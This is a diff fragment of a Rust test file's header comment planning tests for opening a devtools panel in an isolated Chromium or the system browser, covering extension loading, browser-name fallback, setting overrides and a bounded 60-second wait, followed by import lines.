+// Story 055, task 13.1 — `devtools: open in browser`, isolated or system (design.md §B6, §B7,
+// GOTCHA G6, G10). Requirements: R4.1, R4.2, R4.3, R4.4, R4.5, R4.6, R4.7 (Q4, Q5). Wired INSIDE
+// `src/browser_channel.rs` (path `browser_channel::devtools_browser::…`, filter
+// `cargo test -p agent_ui devtools_browser`):
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_browser.rs"]
+//     mod devtools_browser;
+//
+// Two levels:
+//   1. the launch PLAN, a pure decision, so no test spawns a browser or edits `$PATH` (a process
+//      variable shared by every parallel test). Assumed seam — named only in `plan()` below:
+//      `crate::devtools_browser::plan(target, url, data_dir, extension_dir, lookup) -> Launch`,
+//      `target: BrowserTarget::{Isolated, System}`, `lookup: &dyn Fn(&str) -> Option<PathBuf>`
+//      (the PATH search, injected), `Launch::Chromium { program, args }` or
+//      `Launch::Default { url, notice: Option<String> }`;
+//   2. the ACTION, end to end in a test window with `devtools.browser = system` — the opened URL
+//      is read back from gpui's test platform (`TestAppContext::opened_url`). Assumed seam — named
+//      only in `open_in_browser()` below: `crate::devtools_browser::open_in_browser(workspace,
+//      target: Option<BrowserTarget>, window, cx)`, `None` meaning "the setting decides" (R4.6).
+//
+// Hostile halves first:
+//   - `--load-extension` only for a directory that HOLDS a manifest.json: a set path without one
+//     (or no path) adds nothing — a flag pointing at an empty directory makes Chromium warn on
+//     every start;
+//   - `chromium-browser` counts when `chromium` is absent (Debian's name), and with neither the
+//     panel opens in the default browser WITH the R4.4 notice — never silently;
+//   - the explicit actions win over the setting in both directions (R4.6);
+//   - the URL fragment names the thread just CREATED for this project, never an existing one;
+//   - R4.7, the wait is bounded and its end is final: nothing at 59 s, at 60 s the open is cancelled
+//     with R1.6's notice and no browser — and an announce arriving AFTER that opens nothing (a
+//     timeout that only stopped waiting would still fire the late open).
+
+use std::path::{Path, PathBuf};
+
+use acp_thread::StubAgentConnection;
+use gpui::{TestAppContext, UpdateGlobal as _};
+use serde_json::{Value, json};
